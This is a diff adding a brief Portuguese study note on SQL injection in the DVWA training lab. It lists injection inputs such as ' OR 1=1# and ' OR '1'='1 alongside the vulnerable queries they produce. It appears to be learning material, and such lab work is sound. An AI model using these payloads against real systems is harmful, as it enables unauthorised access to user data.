@@ -1,0 +1,19 @@
+<DVWA>
+DVWA Security > Díficil > Submit
+
+SQL Injection
+
+Podemos testar:
+'
+''
+1' OR 1=1# --> Retorna nomes de todos os usuários.
+
+Query: SELECT * FROM users WHERE user_id='" $id_user "';
+---------------------------------------------------------  
+
+Injeção 1: ' OR 1=1#
+Query: SELECT * FROM users WHERE user_id='' OR 1=1;
+
+
+Injeção 2: ' OR '1'='1
+Query: SELECT * FROM users WHERE user_id='" $id_user "';
